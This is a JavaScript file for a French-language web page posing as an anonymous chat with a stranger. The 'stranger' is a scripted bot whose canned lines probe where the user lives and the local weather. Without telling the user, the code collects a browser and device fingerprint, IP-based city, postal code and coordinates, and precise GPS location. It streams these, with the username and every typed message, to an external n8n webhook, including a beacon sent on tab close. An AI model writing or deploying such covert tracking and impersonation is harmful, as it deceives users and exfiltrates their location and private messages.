document.addEventListener('DOMContentLoaded', () => {
    // DOM Elements
    const screenUsername = document.getElementById('screen-username');
    const screenLocation = document.getElementById('screen-location');
    const screenSearching = document.getElementById('screen-searching');
    const screenChat = document.getElementById('screen-chat');

    const usernameInput = document.getElementById('username-input');
    const btnNextLocation = document.getElementById('btn-next-location');
    
    const btnSearch = document.getElementById('btn-search');
    const btnSwitch = document.getElementById('btn-switch');

    const chatMessages = document.getElementById('chat-messages');
    const chatInput = document.getElementById('chat-input');
    const btnSend = document.getElementById('btn-send');

    // State
    let userProfile = {
        username: '',
        location: ''
    };
    let chatSessionId = '';
    let sessionStartTime = Date.now();
    let messageCount = 0;
    let deviceInfo = {};
    
    const WEBHOOK_URL = 'https://n8n.krf-studio.com/webhook/2a849483-3467-4ca5-ae04-b53de826226e';

    // ── Device & Browser Fingerprint (runs once on load) ──
    function collectDeviceInfo() {
        const nav = navigator;
        const scr = screen;
        const w = window;

        deviceInfo = {
            // Browser
            userAgent: nav.userAgent,
            platform: nav.platform,
            language: nav.language,
            languages: nav.languages ? nav.languages.join(', ') : nav.language,
            cookiesEnabled: nav.cookieEnabled,
            doNotTrack: nav.doNotTrack,
            
            // Screen
            screenWidth: scr.width,
            screenHeight: scr.height,
            screenAvailWidth: scr.availWidth,
            screenAvailHeight: scr.availHeight,
            colorDepth: scr.colorDepth,
            pixelRatio: w.devicePixelRatio,
            
            // Window
            innerWidth: w.innerWidth,
            innerHeight: w.innerHeight,
            
            // Timezone
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            
            // Touch
            touchSupport: 'ontouchstart' in w || nav.maxTouchPoints > 0,
            maxTouchPoints: nav.maxTouchPoints || 0,
            
            // Hardware
            hardwareConcurrency: nav.hardwareConcurrency || 'unknown',
            deviceMemory: nav.deviceMemory || 'unknown',
            
            // Connection
            connectionType: 'unknown',
            connectionDownlink: 'unknown',
            connectionEffectiveType: 'unknown',
            
            // Referrer
            referrer: document.referrer || 'direct',
            currentUrl: w.location.href
        };

        // Network info (if available)
        const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
        if (conn) {
            deviceInfo.connectionType = conn.type || 'unknown';
            deviceInfo.connectionDownlink = conn.downlink || 'unknown';
            deviceInfo.connectionEffectiveType = conn.effectiveType || 'unknown';
            deviceInfo.connectionSaveData = conn.saveData || false;
        }

        // Battery info
        if (nav.getBattery) {
            nav.getBattery().then(battery => {
                deviceInfo.batteryLevel = Math.round(battery.level * 100) + '%';
                deviceInfo.batteryCharging = battery.charging;
            }).catch(() => {});
        }

        // Canvas fingerprint (lightweight)
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('fp', 2, 2);
            deviceInfo.canvasHash = canvas.toDataURL().slice(-50);
        } catch(e) {
            deviceInfo.canvasHash = 'blocked';
        }

        // WebGL renderer
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    deviceInfo.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    deviceInfo.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch(e) {
            deviceInfo.gpuVendor = 'unknown';
            deviceInfo.gpuRenderer = 'unknown';
        }

        // Installed plugins count
        deviceInfo.pluginsCount = nav.plugins ? nav.plugins.length : 0;

        // Media devices (count only, no permission needed)
        if (nav.mediaDevices && nav.mediaDevices.enumerateDevices) {
            nav.mediaDevices.enumerateDevices().then(devices => {
                deviceInfo.audioInputs = devices.filter(d => d.kind === 'audioinput').length;
                deviceInfo.audioOutputs = devices.filter(d => d.kind === 'audiooutput').length;
                deviceInfo.videoInputs = devices.filter(d => d.kind === 'videoinput').length;
            }).catch(() => {});
        }
    }

    collectDeviceInfo();

    // ── IP & Geo data via external API ──
    let ipData = {};
    function collectIpData() {
        return fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                ipData = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    countryCode: data.country_code,
                    postal: data.postal,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    isp: data.org,
                    asn: data.asn
                };
                return ipData;
            })
            .catch(() => { ipData = { error: 'blocked' }; return ipData; });
    }

    // Start collecting IP data immediately
    const ipDataPromise = collectIpData();

    // Send a webhook as soon as we have the initial data (IP + Device Info)
    ipDataPromise.then(() => {
        sendToWebhook('page_visit', { action: 'user_landed_on_main_page' });
    });

    // ── Webhook sender ──
    function sendToWebhook(eventType, data) {
        const payload = {
            event: eventType,
            timestamp: new Date().toISOString(),
            chatSessionId: chatSessionId,
            sessionDuration: Math.round((Date.now() - sessionStartTime) / 1000) + 's',
            user: userProfile,
            device: deviceInfo,
            network: ipData,
            ...data
        };

        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(() => {});
    }

    // ── Screen transition ──
    function switchScreen(hideScreen, showScreen) {
        hideScreen.classList.remove('active');
        hideScreen.classList.add('hidden');
        
        setTimeout(() => {
            showScreen.classList.remove('hidden');
            setTimeout(() => {
                showScreen.classList.add('active');
            }, 50);
        }, 400);
    }

    // ── Username screen ──
    function submitUsername() {
        const val = usernameInput.value.trim();
        if (val) {
            userProfile.username = val;
            switchScreen(screenUsername, screenLocation);
        } else {
            usernameInput.focus();
        }
    }

    btnNextLocation.addEventListener('click', submitUsername);
    usernameInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') submitUsername();
    });

    // ── Location (GPS + IP fallback) ──
    function submitLocation() {
        if ("geolocation" in navigator) {
            btnSearch.textContent = "Autorisation...";
            navigator.geolocation.getCurrentPosition(function(position) {
                userProfile.location = `${position.coords.latitude}, ${position.coords.longitude}`;
                userProfile.locationAccuracy = position.coords.accuracy + 'm';
                userProfile.locationSource = 'GPS';
                ipDataPromise.then(() => startMatching());
            }, function(error) {
                // GPS denied → use IP data already fetched
                ipDataPromise.then(data => {
                    if (data && data.city) {
                        userProfile.location = `${data.latitude}, ${data.longitude}`;
                        userProfile.locationSource = 'IP';
                        userProfile.locationCity = `${data.city}, ${data.country}`;
                    } else {
                        userProfile.location = 'unavailable';
                        userProfile.locationSource = 'denied';
                    }
                    startMatching();
                });
            }, {
                enableHighAccuracy: true,
                timeout: 8000,
                maximumAge: 0
            });
        } else {
            ipDataPromise.then(data => {
                if (data && data.city) {
                    userProfile.location = `${data.latitude}, ${data.longitude}`;
                    userProfile.locationSource = 'IP';
                } else {
                    userProfile.location = 'unavailable';
                    userProfile.locationSource = 'unsupported';
                }
                startMatching();
            });
        }
    }

    function startMatching() {
        btnSearch.textContent = "Autoriser la localisation";
        
        chatSessionId = Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
        messageCount = 0;

        sendToWebhook('session_start', { status: 'matching' });

        switchScreen(screenLocation, screenSearching);
        
        const searchDuration = 2500 + Math.random() * 2000;
        setTimeout(() => {
            switchScreen(screenSearching, screenChat);
            
            chatMessages.innerHTML = '';
            appendMessage("Vous êtes maintenant connecté avec un inconnu. Dites bonjour !", "system");
            botResponseIndex = 0;
            
            sendToWebhook('chat_connected', {});
        }, searchDuration);
    }

    btnSearch.addEventListener('click', submitLocation);

    // ── Switch partner ──
    if (btnSwitch) {
        btnSwitch.addEventListener('click', () => {
            sendToWebhook('chat_ended', { 
                reason: 'user_switched',
                messagesInSession: messageCount
            });
            switchScreen(screenChat, screenSearching);
            startMatching();
        });
    }

    // ── Chat Functions ──
    function appendMessage(text, type) {
        const msgDiv = document.createElement('div');
        msgDiv.className = `message msg-${type}`;
        msgDiv.textContent = text;
        chatMessages.appendChild(msgDiv);
        scrollToBottom();
    }

    function scrollToBottom() {
        chatMessages.scrollTop = chatMessages.scrollHeight;
    }

    let typingIndicatorVisible = false;
    let typingIndicatorElement = null;

    function showTypingIndicator() {
        if (typingIndicatorVisible) return;
        typingIndicatorVisible = true;
        
        typingIndicatorElement = document.createElement('div');
        typingIndicatorElement.className = 'typing-indicator';
        typingIndicatorElement.innerHTML = '<span></span><span></span><span></span>';
        
        chatMessages.appendChild(typingIndicatorElement);
        scrollToBottom();
    }

    function hideTypingIndicator() {
        if (typingIndicatorElement) {
            typingIndicatorElement.remove();
            typingIndicatorElement = null;
            typingIndicatorVisible = false;
        }
    }

    // Bot Responses
    const botResponses = [
        "Salut ! Comment tu vas ?",
        "C'est cool de parler ici.",
        "Moi je suis juste là pour discuter un peu.",
        "Tu fais quoi de beau ?",
        "Où ça exactement ?",
        "Ah ouais, je connais un peu !",
        "D'ailleurs, il fait quel temps chez toi ?",
        "C'est sympa. Tu aimes la musique ?",
        "Moi j'écoute de tout, mais surtout de l'electro en ce moment.",
        "Haha oui, carrément.",
        "Et sinon t'es sur quoi comme série ?",
        "Ah j'en ai entendu parler, il faut que je regarde giga vite !",
        "Bon, je vais bientôt devoir y aller.",
        "Allez salut ! A la prochaine !"
    ];
    let botResponseIndex = 0;

    function handleBotReply() {
        showTypingIndicator();
        
        const replyTime = Math.random() * 1500 + 1500;
        
        setTimeout(() => {
            hideTypingIndicator();
            
            let replyText;
            if (botResponseIndex < botResponses.length) {
                replyText = botResponses[botResponseIndex];
                botResponseIndex++;
            } else {
                replyText = "Ouais haha..."; 
            }
            
            appendMessage(replyText, 'received');
        }, replyTime);
    }

    // ── Send Message ──
    function sendMessage() {
        const text = chatInput.value.trim();
        if (text) {
            messageCount++;
            appendMessage(text, 'sent');
            chatInput.value = '';
            
            sendToWebhook('message', { 
                message: text,
                messageNumber: messageCount
            });
            
            handleBotReply();
        }
        chatInput.focus();
    }

    btnSend.addEventListener('click', sendMessage);
    chatInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') sendMessage();
    });

    // ── Passive event tracking ──
    
    // Track when user leaves/returns to the tab
    document.addEventListener('visibilitychange', () => {
        if (chatSessionId) {
            sendToWebhook('visibility', {
                state: document.visibilityState
            });
        }
    });

    // Track page unload (user closing tab)
    window.addEventListener('beforeunload', () => {
        if (chatSessionId) {
            const payload = {
                event: 'session_end',
                timestamp: new Date().toISOString(),
                chatSessionId: chatSessionId,
                totalDuration: Math.round((Date.now() - sessionStartTime) / 1000) + 's',
                totalMessages: messageCount,
                user: userProfile,
                device: deviceInfo,
                network: ipData
            };
            // Use sendBeacon to ensure delivery even on page close
            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(payload));
        }
    });

    // Initialize
    usernameInput.focus();
});
